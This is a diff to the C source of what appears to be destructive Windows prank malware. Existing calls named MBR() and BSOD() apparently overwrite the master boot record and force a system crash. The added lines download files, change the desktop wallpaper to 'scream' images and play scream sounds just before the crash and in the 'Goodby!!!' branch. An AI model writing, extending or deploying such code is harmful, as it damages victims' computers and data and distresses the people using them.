@@ -30,6 +30,9 @@ int loop(){
         c++;
         loop();
     } else {
+        char* str = "C:\\Users\\Public\\Downloads\\screamBG.bmp";
+        SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, str, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
+        PlaySound(L"C:\\Users\\Public\\Downloads\\scream.wav", NULL, SND_FILENAME);
         BSOD();
     }
     return 0;
@@ -51,10 +54,13 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrevInst, LPSTR, int) {
             MB_ICONEXCLAMATION | MB_OK);
         Download();
         PlaySound(L"C:\\Users\\Public\\Downloads\\BG.wav", NULL, SND_LOOP | SND_ASYNC);
+        char* str = "C:\\Users\\Public\\Downloads\\WP.bmp";
+        SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, str, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
         MBR();
         loop();
     }
     else {
+        Download();
         int msgboxID = MessageBox(
             NULL,
             L"Goodby!!!",
@@ -62,6 +68,9 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrevInst, LPSTR, int) {
             MB_ICONEXCLAMATION | MB_OK);
 
         if (msgboxID == IDOK) {
+            char* str = "C:\\Users\\Public\\Downloads\\screamBG.bmp";
+            SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, str, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
+            PlaySound(L"C:\\Users\\Public\\Downloads\\scream.wav", NULL, SND_FILENAME);
             BSOD();
         }
     }
